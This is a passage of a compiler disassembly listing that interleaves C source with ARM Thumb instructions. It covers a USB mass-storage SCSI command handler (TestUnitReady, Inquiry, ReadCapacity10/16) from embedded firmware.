 8009bbc:	e06e      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 8009bbe:	7afb      	ldrb	r3, [r7, #11]
 8009bc0:	687a      	ldr	r2, [r7, #4]
 8009bc2:	4619      	mov	r1, r3
 8009bc4:	68f8      	ldr	r0, [r7, #12]
 8009bc6:	f000 fcd2 	bl	800a56e <SCSI_AllowPreventRemovable>
 8009bca:	4603      	mov	r3, r0
 8009bcc:	75fb      	strb	r3, [r7, #23]
      break;
 8009bce:	e065      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 8009bd0:	7afb      	ldrb	r3, [r7, #11]
 8009bd2:	687a      	ldr	r2, [r7, #4]
 8009bd4:	4619      	mov	r1, r3
 8009bd6:	68f8      	ldr	r0, [r7, #12]
 8009bd8:	f000 fb16 	bl	800a208 <SCSI_ModeSense6>
 8009bdc:	4603      	mov	r3, r0
 8009bde:	75fb      	strb	r3, [r7, #23]
      break;
 8009be0:	e05c      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009be2:	7afb      	ldrb	r3, [r7, #11]
 8009be4:	687a      	ldr	r2, [r7, #4]
 8009be6:	4619      	mov	r1, r3
 8009be8:	68f8      	ldr	r0, [r7, #12]
 8009bea:	f000 fb3d 	bl	800a268 <SCSI_ModeSense10>
 8009bee:	4603      	mov	r3, r0
 8009bf0:	75fb      	strb	r3, [r7, #23]
      break;
 8009bf2:	e053      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009bf4:	7afb      	ldrb	r3, [r7, #11]
 8009bf6:	687a      	ldr	r2, [r7, #4]
 8009bf8:	4619      	mov	r1, r3
 8009bfa:	68f8      	ldr	r0, [r7, #12]
 8009bfc:	f000 fa86 	bl	800a10c <SCSI_ReadFormatCapacity>
 8009c00:	4603      	mov	r3, r0
 8009c02:	75fb      	strb	r3, [r7, #23]
      break;
 8009c04:	e04a      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009c06:	7afb      	ldrb	r3, [r7, #11]
 8009c08:	687a      	ldr	r2, [r7, #4]
 8009c0a:	4619      	mov	r1, r3
 8009c0c:	68f8      	ldr	r0, [r7, #12]
 8009c0e:	f000 f929 	bl	8009e64 <SCSI_ReadCapacity10>
 8009c12:	4603      	mov	r3, r0
 8009c14:	75fb      	strb	r3, [r7, #23]
      break;
 8009c16:	e041      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009c18:	7afb      	ldrb	r3, [r7, #11]
 8009c1a:	687a      	ldr	r2, [r7, #4]
 8009c1c:	4619      	mov	r1, r3
 8009c1e:	68f8      	ldr	r0, [r7, #12]
 8009c20:	f000 f9af 	bl	8009f82 <SCSI_ReadCapacity16>
 8009c24:	4603      	mov	r3, r0
 8009c26:	75fb      	strb	r3, [r7, #23]
      break;
 8009c28:	e038      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009c2a:	7afb      	ldrb	r3, [r7, #11]
 8009c2c:	687a      	ldr	r2, [r7, #4]
 8009c2e:	4619      	mov	r1, r3
 8009c30:	68f8      	ldr	r0, [r7, #12]
 8009c32:	f000 fccd 	bl	800a5d0 <SCSI_Read10>
 8009c36:	4603      	mov	r3, r0
 8009c38:	75fb      	strb	r3, [r7, #23]
      break;
 8009c3a:	e02f      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009c3c:	7afb      	ldrb	r3, [r7, #11]
 8009c3e:	687a      	ldr	r2, [r7, #4]
 8009c40:	4619      	mov	r1, r3
 8009c42:	68f8      	ldr	r0, [r7, #12]
 8009c44:	f000 fd7b 	bl	800a73e <SCSI_Read12>
 8009c48:	4603      	mov	r3, r0
 8009c4a:	75fb      	strb	r3, [r7, #23]
      break;
 8009c4c:	e026      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009c4e:	7afb      	ldrb	r3, [r7, #11]
 8009c50:	687a      	ldr	r2, [r7, #4]
 8009c52:	4619      	mov	r1, r3
 8009c54:	68f8      	ldr	r0, [r7, #12]
 8009c56:	f000 fe33 	bl	800a8c0 <SCSI_Write10>
 8009c5a:	4603      	mov	r3, r0
 8009c5c:	75fb      	strb	r3, [r7, #23]
      break;
 8009c5e:	e01d      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009c60:	7afb      	ldrb	r3, [r7, #11]
 8009c62:	687a      	ldr	r2, [r7, #4]
 8009c64:	4619      	mov	r1, r3
 8009c66:	68f8      	ldr	r0, [r7, #12]
 8009c68:	f000 ff0e 	bl	800aa88 <SCSI_Write12>
 8009c6c:	4603      	mov	r3, r0
 8009c6e:	75fb      	strb	r3, [r7, #23]
      break;
 8009c70:	e014      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009c72:	7afb      	ldrb	r3, [r7, #11]
 8009c74:	687a      	ldr	r2, [r7, #4]
 8009c76:	4619      	mov	r1, r3
 8009c78:	68f8      	ldr	r0, [r7, #12]
 8009c7a:	f000 fff9 	bl	800ac70 <SCSI_Verify10>
 8009c7e:	4603      	mov	r3, r0
 8009c80:	75fb      	strb	r3, [r7, #23]
      break;
 8009c82:	e00b      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009c84:	7af9      	ldrb	r1, [r7, #11]
 8009c86:	2320      	movs	r3, #32
 8009c88:	2205      	movs	r2, #5
 8009c8a:	68f8      	ldr	r0, [r7, #12]
 8009c8c:	f000 fbb6 	bl	800a3fc <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009c90:	693b      	ldr	r3, [r7, #16]
 8009c92:	2202      	movs	r2, #2
 8009c94:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009c96:	23ff      	movs	r3, #255	; 0xff
 8009c98:	75fb      	strb	r3, [r7, #23]
      break;
 8009c9a:	bf00      	nop
  }

  return ret;
 8009c9c:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009ca0:	4618      	mov	r0, r3
 8009ca2:	3718      	adds	r7, #24
 8009ca4:	46bd      	mov	sp, r7
 8009ca6:	bd80      	pop	{r7, pc}

08009ca8 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009ca8:	b580      	push	{r7, lr}
 8009caa:	b086      	sub	sp, #24
 8009cac:	af00      	add	r7, sp, #0
 8009cae:	60f8      	str	r0, [r7, #12]
 8009cb0:	460b      	mov	r3, r1
 8009cb2:	607a      	str	r2, [r7, #4]
 8009cb4:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009cb6:	68fb      	ldr	r3, [r7, #12]
 8009cb8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009cbc:	68fb      	ldr	r3, [r7, #12]
 8009cbe:	32b0      	adds	r2, #176	; 0xb0
 8009cc0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009cc4:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009cc6:	697b      	ldr	r3, [r7, #20]
 8009cc8:	2b00      	cmp	r3, #0
 8009cca:	d102      	bne.n	8009cd2 <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009ccc:	f04f 33ff 	mov.w	r3, #4294967295
 8009cd0:	e043      	b.n	8009d5a <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009cd2:	697b      	ldr	r3, [r7, #20]
 8009cd4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cd8:	699b      	ldr	r3, [r3, #24]
 8009cda:	2b00      	cmp	r3, #0
 8009cdc:	d00b      	beq.n	8009cf6 <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009cde:	697b      	ldr	r3, [r7, #20]
 8009ce0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ce4:	7f59      	ldrb	r1, [r3, #29]
 8009ce6:	2320      	movs	r3, #32
 8009ce8:	2205      	movs	r2, #5
 8009cea:	68f8      	ldr	r0, [r7, #12]
 8009cec:	f000 fb86 	bl	800a3fc <SCSI_SenseCode>

    return -1;
 8009cf0:	f04f 33ff 	mov.w	r3, #4294967295
 8009cf4:	e031      	b.n	8009d5a <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009cf6:	697b      	ldr	r3, [r7, #20]
 8009cf8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cfc:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009d00:	2b02      	cmp	r3, #2
 8009d02:	d10b      	bne.n	8009d1c <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009d04:	7af9      	ldrb	r1, [r7, #11]
 8009d06:	233a      	movs	r3, #58	; 0x3a
 8009d08:	2202      	movs	r2, #2
 8009d0a:	68f8      	ldr	r0, [r7, #12]
 8009d0c:	f000 fb76 	bl	800a3fc <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009d10:	697b      	ldr	r3, [r7, #20]
 8009d12:	2205      	movs	r2, #5
 8009d14:	721a      	strb	r2, [r3, #8]
    return -1;
 8009d16:	f04f 33ff 	mov.w	r3, #4294967295
 8009d1a:	e01e      	b.n	8009d5a <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009d1c:	68fb      	ldr	r3, [r7, #12]
 8009d1e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009d22:	68fa      	ldr	r2, [r7, #12]
 8009d24:	33b0      	adds	r3, #176	; 0xb0
 8009d26:	009b      	lsls	r3, r3, #2
 8009d28:	4413      	add	r3, r2
 8009d2a:	685b      	ldr	r3, [r3, #4]
 8009d2c:	689b      	ldr	r3, [r3, #8]
 8009d2e:	7afa      	ldrb	r2, [r7, #11]
 8009d30:	4610      	mov	r0, r2
 8009d32:	4798      	blx	r3
 8009d34:	4603      	mov	r3, r0
 8009d36:	2b00      	cmp	r3, #0
 8009d38:	d00b      	beq.n	8009d52 <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009d3a:	7af9      	ldrb	r1, [r7, #11]
 8009d3c:	233a      	movs	r3, #58	; 0x3a
 8009d3e:	2202      	movs	r2, #2
 8009d40:	68f8      	ldr	r0, [r7, #12]
 8009d42:	f000 fb5b 	bl	800a3fc <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009d46:	697b      	ldr	r3, [r7, #20]
 8009d48:	2205      	movs	r2, #5
 8009d4a:	721a      	strb	r2, [r3, #8]

    return -1;
 8009d4c:	f04f 33ff 	mov.w	r3, #4294967295
 8009d50:	e003      	b.n	8009d5a <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009d52:	697b      	ldr	r3, [r7, #20]
 8009d54:	2200      	movs	r2, #0
 8009d56:	60da      	str	r2, [r3, #12]

  return 0;
 8009d58:	2300      	movs	r3, #0
}
 8009d5a:	4618      	mov	r0, r3
 8009d5c:	3718      	adds	r7, #24
 8009d5e:	46bd      	mov	sp, r7
 8009d60:	bd80      	pop	{r7, pc}
	...

08009d64 <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009d64:	b580      	push	{r7, lr}
 8009d66:	b088      	sub	sp, #32
 8009d68:	af00      	add	r7, sp, #0
 8009d6a:	60f8      	str	r0, [r7, #12]
 8009d6c:	460b      	mov	r3, r1
 8009d6e:	607a      	str	r2, [r7, #4]
 8009d70:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009d72:	68fb      	ldr	r3, [r7, #12]
 8009d74:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d78:	68fb      	ldr	r3, [r7, #12]
 8009d7a:	32b0      	adds	r2, #176	; 0xb0
 8009d7c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d80:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009d82:	69bb      	ldr	r3, [r7, #24]
 8009d84:	2b00      	cmp	r3, #0
 8009d86:	d102      	bne.n	8009d8e <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009d88:	f04f 33ff 	mov.w	r3, #4294967295
 8009d8c:	e062      	b.n	8009e54 <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009d8e:	69bb      	ldr	r3, [r7, #24]
 8009d90:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d94:	699b      	ldr	r3, [r3, #24]
 8009d96:	2b00      	cmp	r3, #0
 8009d98:	d10b      	bne.n	8009db2 <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009d9a:	69bb      	ldr	r3, [r7, #24]
 8009d9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009da0:	7f59      	ldrb	r1, [r3, #29]
 8009da2:	2320      	movs	r3, #32
 8009da4:	2205      	movs	r2, #5
 8009da6:	68f8      	ldr	r0, [r7, #12]
 8009da8:	f000 fb28 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 8009dac:	f04f 33ff 	mov.w	r3, #4294967295
 8009db0:	e050      	b.n	8009e54 <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009db2:	687b      	ldr	r3, [r7, #4]
 8009db4:	3301      	adds	r3, #1
 8009db6:	781b      	ldrb	r3, [r3, #0]
 8009db8:	f003 0301 	and.w	r3, r3, #1
 8009dbc:	2b00      	cmp	r3, #0
 8009dbe:	d021      	beq.n	8009e04 <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009dc0:	687b      	ldr	r3, [r7, #4]
 8009dc2:	3302      	adds	r3, #2
 8009dc4:	781b      	ldrb	r3, [r3, #0]
 8009dc6:	2b00      	cmp	r3, #0
 8009dc8:	d105      	bne.n	8009dd6 <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009dca:	2206      	movs	r2, #6
 8009dcc:	4923      	ldr	r1, [pc, #140]	; (8009e5c <SCSI_Inquiry+0xf8>)
 8009dce:	69b8      	ldr	r0, [r7, #24]
 8009dd0:	f001 f8fa 	bl	800afc8 <SCSI_UpdateBotData>
 8009dd4:	e03d      	b.n	8009e52 <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009dd6:	687b      	ldr	r3, [r7, #4]
 8009dd8:	3302      	adds	r3, #2
 8009dda:	781b      	ldrb	r3, [r3, #0]
 8009ddc:	2b80      	cmp	r3, #128	; 0x80
 8009dde:	d105      	bne.n	8009dec <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009de0:	2208      	movs	r2, #8
 8009de2:	491f      	ldr	r1, [pc, #124]	; (8009e60 <SCSI_Inquiry+0xfc>)
 8009de4:	69b8      	ldr	r0, [r7, #24]
 8009de6:	f001 f8ef 	bl	800afc8 <SCSI_UpdateBotData>
 8009dea:	e032      	b.n	8009e52 <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009dec:	69bb      	ldr	r3, [r7, #24]
 8009dee:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009df2:	7f59      	ldrb	r1, [r3, #29]
 8009df4:	2324      	movs	r3, #36	; 0x24
 8009df6:	2205      	movs	r2, #5
 8009df8:	68f8      	ldr	r0, [r7, #12]
 8009dfa:	f000 faff 	bl	800a3fc <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009dfe:	f04f 33ff 	mov.w	r3, #4294967295
 8009e02:	e027      	b.n	8009e54 <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009e04:	68fb      	ldr	r3, [r7, #12]
 8009e06:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009e0a:	68fa      	ldr	r2, [r7, #12]
 8009e0c:	33b0      	adds	r3, #176	; 0xb0
 8009e0e:	009b      	lsls	r3, r3, #2
 8009e10:	4413      	add	r3, r2
 8009e12:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009e14:	69d9      	ldr	r1, [r3, #28]
 8009e16:	7afa      	ldrb	r2, [r7, #11]
 8009e18:	4613      	mov	r3, r2
 8009e1a:	00db      	lsls	r3, r3, #3
 8009e1c:	4413      	add	r3, r2
 8009e1e:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009e20:	440b      	add	r3, r1
 8009e22:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009e24:	697b      	ldr	r3, [r7, #20]
 8009e26:	3304      	adds	r3, #4
 8009e28:	781b      	ldrb	r3, [r3, #0]
 8009e2a:	b29b      	uxth	r3, r3
 8009e2c:	3305      	adds	r3, #5
 8009e2e:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009e30:	687b      	ldr	r3, [r7, #4]
 8009e32:	3304      	adds	r3, #4
 8009e34:	781b      	ldrb	r3, [r3, #0]
 8009e36:	b29b      	uxth	r3, r3
 8009e38:	8bfa      	ldrh	r2, [r7, #30]
 8009e3a:	429a      	cmp	r2, r3
 8009e3c:	d303      	bcc.n	8009e46 <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009e3e:	687b      	ldr	r3, [r7, #4]
 8009e40:	3304      	adds	r3, #4
 8009e42:	781b      	ldrb	r3, [r3, #0]
 8009e44:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009e46:	8bfb      	ldrh	r3, [r7, #30]
 8009e48:	461a      	mov	r2, r3
 8009e4a:	6979      	ldr	r1, [r7, #20]
 8009e4c:	69b8      	ldr	r0, [r7, #24]
 8009e4e:	f001 f8bb 	bl	800afc8 <SCSI_UpdateBotData>
  }

  return 0;
 8009e52:	2300      	movs	r3, #0
}
 8009e54:	4618      	mov	r0, r3
 8009e56:	3720      	adds	r7, #32
 8009e58:	46bd      	mov	sp, r7
 8009e5a:	bd80      	pop	{r7, pc}
 8009e5c:	2000010c 	.word	0x2000010c
 8009e60:	20000114 	.word	0x20000114

08009e64 <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009e64:	b590      	push	{r4, r7, lr}
 8009e66:	b087      	sub	sp, #28
 8009e68:	af00      	add	r7, sp, #0
 8009e6a:	60f8      	str	r0, [r7, #12]
 8009e6c:	460b      	mov	r3, r1
 8009e6e:	607a      	str	r2, [r7, #4]
 8009e70:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009e72:	68fb      	ldr	r3, [r7, #12]
 8009e74:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009e78:	68fb      	ldr	r3, [r7, #12]
 8009e7a:	32b0      	adds	r2, #176	; 0xb0
 8009e7c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009e80:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009e82:	697b      	ldr	r3, [r7, #20]
 8009e84:	2b00      	cmp	r3, #0
 8009e86:	d102      	bne.n	8009e8e <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009e88:	f04f 33ff 	mov.w	r3, #4294967295
 8009e8c:	e075      	b.n	8009f7a <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009e8e:	68fb      	ldr	r3, [r7, #12]
 8009e90:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009e94:	68fa      	ldr	r2, [r7, #12]
 8009e96:	33b0      	adds	r3, #176	; 0xb0
 8009e98:	009b      	lsls	r3, r3, #2
 8009e9a:	4413      	add	r3, r2
 8009e9c:	685b      	ldr	r3, [r3, #4]
 8009e9e:	685c      	ldr	r4, [r3, #4]
 8009ea0:	697b      	ldr	r3, [r7, #20]
 8009ea2:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009ea6:	3308      	adds	r3, #8
 8009ea8:	697a      	ldr	r2, [r7, #20]
 8009eaa:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009eae:	3204      	adds	r2, #4
 8009eb0:	7af8      	ldrb	r0, [r7, #11]
 8009eb2:	4619      	mov	r1, r3
 8009eb4:	47a0      	blx	r4
 8009eb6:	4603      	mov	r3, r0
 8009eb8:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009eba:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009ebe:	2b00      	cmp	r3, #0
 8009ec0:	d106      	bne.n	8009ed0 <SCSI_ReadCapacity10+0x6c>
 8009ec2:	697b      	ldr	r3, [r7, #20]
 8009ec4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ec8:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009ecc:	2b02      	cmp	r3, #2
 8009ece:	d108      	bne.n	8009ee2 <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009ed0:	7af9      	ldrb	r1, [r7, #11]
 8009ed2:	233a      	movs	r3, #58	; 0x3a
 8009ed4:	2202      	movs	r2, #2
 8009ed6:	68f8      	ldr	r0, [r7, #12]
 8009ed8:	f000 fa90 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 8009edc:	f04f 33ff 	mov.w	r3, #4294967295
 8009ee0:	e04b      	b.n	8009f7a <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009ee2:	697b      	ldr	r3, [r7, #20]
 8009ee4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ee8:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009eea:	3b01      	subs	r3, #1
 8009eec:	0e1b      	lsrs	r3, r3, #24
 8009eee:	b2da      	uxtb	r2, r3
 8009ef0:	697b      	ldr	r3, [r7, #20]
 8009ef2:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009ef4:	697b      	ldr	r3, [r7, #20]
 8009ef6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009efa:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009efc:	3b01      	subs	r3, #1
 8009efe:	0c1b      	lsrs	r3, r3, #16
 8009f00:	b2da      	uxtb	r2, r3
 8009f02:	697b      	ldr	r3, [r7, #20]
 8009f04:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009f06:	697b      	ldr	r3, [r7, #20]
 8009f08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f0c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f0e:	3b01      	subs	r3, #1
 8009f10:	0a1b      	lsrs	r3, r3, #8
 8009f12:	b2da      	uxtb	r2, r3
 8009f14:	697b      	ldr	r3, [r7, #20]
 8009f16:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009f18:	697b      	ldr	r3, [r7, #20]
 8009f1a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f1e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f20:	b2db      	uxtb	r3, r3
 8009f22:	3b01      	subs	r3, #1
 8009f24:	b2da      	uxtb	r2, r3
 8009f26:	697b      	ldr	r3, [r7, #20]
 8009f28:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009f2a:	697b      	ldr	r3, [r7, #20]
 8009f2c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f30:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f34:	161b      	asrs	r3, r3, #24
 8009f36:	b2da      	uxtb	r2, r3
 8009f38:	697b      	ldr	r3, [r7, #20]
 8009f3a:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009f3c:	697b      	ldr	r3, [r7, #20]
 8009f3e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f42:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f46:	141b      	asrs	r3, r3, #16
 8009f48:	b2da      	uxtb	r2, r3
 8009f4a:	697b      	ldr	r3, [r7, #20]
 8009f4c:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009f4e:	697b      	ldr	r3, [r7, #20]
 8009f50:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f54:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f58:	0a1b      	lsrs	r3, r3, #8
 8009f5a:	b29b      	uxth	r3, r3
 8009f5c:	b2da      	uxtb	r2, r3
 8009f5e:	697b      	ldr	r3, [r7, #20]
 8009f60:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009f62:	697b      	ldr	r3, [r7, #20]
 8009f64:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f68:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f6c:	b2da      	uxtb	r2, r3
 8009f6e:	697b      	ldr	r3, [r7, #20]
 8009f70:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009f72:	697b      	ldr	r3, [r7, #20]
 8009f74:	2208      	movs	r2, #8
 8009f76:	60da      	str	r2, [r3, #12]

  return 0;
 8009f78:	2300      	movs	r3, #0

}
 8009f7a:	4618      	mov	r0, r3
 8009f7c:	371c      	adds	r7, #28
 8009f7e:	46bd      	mov	sp, r7
 8009f80:	bd90      	pop	{r4, r7, pc}

08009f82 <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f82:	b590      	push	{r4, r7, lr}
 8009f84:	b089      	sub	sp, #36	; 0x24
 8009f86:	af00      	add	r7, sp, #0
 8009f88:	60f8      	str	r0, [r7, #12]
 8009f8a:	460b      	mov	r3, r1
 8009f8c:	607a      	str	r2, [r7, #4]
 8009f8e:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f90:	68fb      	ldr	r3, [r7, #12]
